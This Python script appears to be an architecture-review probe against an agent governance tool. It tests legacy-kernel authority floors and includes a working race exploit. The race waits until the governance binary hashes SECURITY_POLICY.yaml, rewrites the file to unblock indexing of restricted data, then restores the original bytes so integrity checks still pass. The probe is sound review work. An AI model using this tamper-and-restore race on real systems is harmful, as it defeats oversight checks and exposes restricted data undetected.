#!/usr/bin/env python3
"""Independent architecture-review probes against the rejected 4.1.5 binary (scratch only; repository never written).

R1  legacy-kernel floors: a genuine 4.1.2 kernel (which RoT-1 would authenticate as AUTHENTICATED_REJECTED with
    verified:true and read floors from) versus the 4.1.5 kernel, same binary, same L3 role.
R2  use-time TOCTOU: a same-user process swaps SECURITY_POLICY.yaml after kernel_trust hashed it and restores it when
    the gov process exits. Question: can the verified-bytes / used-bytes gap produce persistent harm while every check
    reports verified:true? (RoT-1 04 section 5 keeps a TrustedKernel "over installed dir".)
"""
import ctypes, ctypes.util, json, os, shutil, struct, subprocess, sys, tempfile, threading, time
import yaml

REPO = "/home/usain/Dynamic-Agentic-Engineering-OS"
GOV = REPO + "/target/release/gov"
SP = os.path.dirname(os.path.abspath(__file__))
S = tempfile.mkdtemp(prefix="review-", dir=SP)
ENV = {k: v for k, v in os.environ.items() if k not in ("GOV_CANONICAL_ROOT", "GOV_ROLE", "GOV_SESSION", "GOV_KERNEL_SOURCE")}
ENV["GOV_KERNEL_CACHE"] = S + "/cache"


def gov(root, role, *args, popen=False):
    cmd = [GOV, "--json", "--root", root, "--session", "S-review", "--role", role, *args]
    if popen:
        return subprocess.Popen(cmd, env=ENV, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    r = subprocess.run(cmd, env=ENV, capture_output=True, text=True)
    try:
        return json.loads(r.stdout)
    except Exception:
        return {"raw": r.stdout[-400:], "stderr": r.stderr[-400:]}


def code(d):
    return (d.get("error") or {}).get("code")


def mkrepo(path):
    os.makedirs(path)
    for c in (["git", "init", "-q"], ["git", "-c", "user.name=r", "-c", "user.email=r@x", "commit", "-q", "--allow-empty", "-m", "init"]):
        subprocess.run(c, cwd=path, check=True)


def commit(path, msg):
    subprocess.run(["git", "add", "-A"], cwd=path, check=True)
    subprocess.run(["git", "-c", "user.name=r", "-c", "user.email=r@x", "commit", "-q", "-m", msg], cwd=path, check=True)


out = {"scratch": S}

# ---------------------------------------------------------------- R1 legacy floors
r1 = {}
for ver in ("4.1.2", "4.1.5"):
    root = f"{S}/legacy-{ver}"
    mkrepo(root)
    init = gov(root, "orchestrator", "init", "--source", f"{REPO}/release/releases/{ver}", "--name", "l", "--skip-index")
    commit(root, "installed")
    trust = gov(root, "orchestrator", "kernel", "trust")
    eff = gov(root, "orchestrator", "policy", "effective", "AUTHORITY_POLICY")
    ops = json.dumps(eff).count('"update_apply"') > 0
    upd = gov(root, "change-controller", "update", "--apply", "--source", f"{REPO}/release/releases/4.1.5")
    res = gov(root, "change-controller", "resume")
    r1[ver] = {
        "init_ok": init.get("ok"), "version": (init.get("result") or {}).get("version"),
        "kernel_trust_verified": (trust.get("result") or {}).get("verified"),
        "AUTHORITY_POLICY_declares_update_apply": ops,
        "L3_change_controller_update_apply": {"ok": upd.get("ok"), "code": code(upd), "applied": (upd.get("result") or {}).get("applied")},
        "L3_change_controller_resume": {"ok": res.get("ok"), "code": code(res)},
    }
out["R1_legacy_kernel_floors"] = r1

# ---------------------------------------------------------------- R2 use-time TOCTOU
libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
IN_CLOSE_NOWRITE = 0x10


def strip_restricted(data):
    def walk(o):
        if isinstance(o, dict):
            for k, v in o.items():
                if k == "never_index_classes" and isinstance(v, list):
                    o[k] = [x for x in v if x != "restricted"]
                else:
                    walk(v)
        elif isinstance(o, list):
            for x in o:
                walk(x)
    walk(data)
    return data


def racer(policy_path, original, tampered, stop, log):
    fd = libc.inotify_init1(0)
    wd = libc.inotify_add_watch(fd, policy_path.encode(), IN_CLOSE_NOWRITE)
    if fd < 0 or wd < 0:
        log.append("inotify failed")
        return
    buf = os.read(fd, 4096)  # first IN_CLOSE_NOWRITE on the policy file = kernel_trust hashing it
    t0 = time.monotonic()
    with open(policy_path, "r+b") as f:  # in-place: same inode, so the watch and later opens see the new bytes
        f.seek(0); f.write(tampered); f.truncate()
    log.append(f"tampered {1e3 * (time.monotonic() - t0):.2f} ms after first close")
    stop.wait()
    with open(policy_path, "r+b") as f:
        f.seek(0); f.write(original); f.truncate()
    log.append("restored original bytes after gov exited")
    os.close(fd)


def restricted_state(rb, q):
    excluded = any("customer/" in (x.get("path", "") if isinstance(x, dict) else str(x)) for x in ((rb.get("result") or {}).get("excluded") or []))
    hits = [h.get("path") for h in ((q.get("result") or {}).get("hits") or []) if "customer/" in (h.get("path") or "")]
    return {"rebuild_ok": rb.get("ok"), "rebuild_code": code(rb), "restricted_excluded": excluded, "restricted_retrievable": hits}


r2 = {"trials": []}
root = f"{S}/race"
mkrepo(root)
gov(root, "orchestrator", "init", "--source", f"{REPO}/release/releases/4.1.5", "--name", "race", "--skip-index")
dsp = f"{root}/governance/project/DATA_SENSITIVITY.yaml"
ds = yaml.safe_load(open(dsp))
ds.setdefault("classifications", []).append({"pattern": "customer/**", "class": "restricted", "reason": "review probe"})
yaml.safe_dump(ds, open(dsp, "w"), sort_keys=False)
os.makedirs(f"{root}/customer")
open(f"{root}/customer/secret.md", "w").write("RVRESTRICTEDMARKER proprietary terms\n")
commit(root, "restricted material")

rb = gov(root, "orchestrator", "rebuild-memory")
q = gov(root, "orchestrator", "memory", "query", "RVRESTRICTEDMARKER")
r2["control_no_race"] = restricted_state(rb, q)

policy = f"{root}/governance/kernel/policies/SECURITY_POLICY.yaml"
original = open(policy, "rb").read()
tampered = yaml.safe_dump(strip_restricted(yaml.safe_load(original)), sort_keys=False).encode()
for trial in range(5):
    stop, log = threading.Event(), []
    th = threading.Thread(target=racer, args=(policy, original, tampered, stop, log), daemon=True)
    th.start()
    time.sleep(0.2)
    p = gov(root, "orchestrator", "rebuild-memory", popen=True)
    so, se = p.communicate()
    stop.set(); th.join(5)
    try:
        rbj = json.loads(so)
    except Exception:
        rbj = {"raw": so[-300:], "stderr": se[-300:]}
    q = gov(root, "orchestrator", "memory", "query", "RVRESTRICTEDMARKER")
    trust = gov(root, "orchestrator", "kernel", "trust")
    doc = gov(root, "orchestrator", "doctor")
    checks = ((doc.get("result") or (doc.get("error") or {}).get("details") or {}).get("checks") or [])
    st = restricted_state(rbj, q)
    st.update({
        "race_log": log,
        "policy_bytes_restored": open(policy, "rb").read() == original,
        "kernel_trust_verified_after": (trust.get("result") or {}).get("verified"),
        "doctor_D003_D029_ok": {c["id"]: c["ok"] for c in checks if c.get("id") in ("D003", "D029")},
    })
    r2["trials"].append(st)
    if st["restricted_retrievable"]:
        break
out["R2_use_time_toctou"] = r2
print(json.dumps(out, indent=2))
